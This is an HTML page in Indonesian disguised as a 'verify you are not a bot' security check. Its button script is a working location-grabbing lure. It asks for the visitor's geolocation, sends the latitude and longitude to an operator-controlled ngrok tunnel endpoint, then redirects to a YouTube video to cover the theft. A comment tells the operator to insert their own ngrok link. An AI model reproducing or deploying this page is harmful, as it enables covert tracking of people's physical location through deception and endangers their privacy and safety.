<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification</title>
</head>
<body>
    <div style="text-align: center; margin-top: 100px;">
        <h2>Konfirmasi Keamanan</h2>
        <p>Klik tombol di bawah untuk melanjutkan</p>
        <button id="btn" style="padding: 15px; background: red; color: white;">SAYA BUKAN BOT</button>
    </div>

    <script>
        document.getElementById('btn').onclick = function() {
            // GANTI LINK INI DENGAN LINK NGROK KAMU SEKARANG
            const urlNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    fetch(urlNgrok + "/api/kirim-lokasi?lat=" + lat + "&lon=" + lon)
                    .then(function() {
                        window.location.href = "https://www.youtube.com/watch?v=EFmxPMdBqmU";
                    });
                }, function(err) {
                    alert("Klik Izinkan agar bisa lanjut!");
                });
            }
        };
    </script>
</body>
</html>
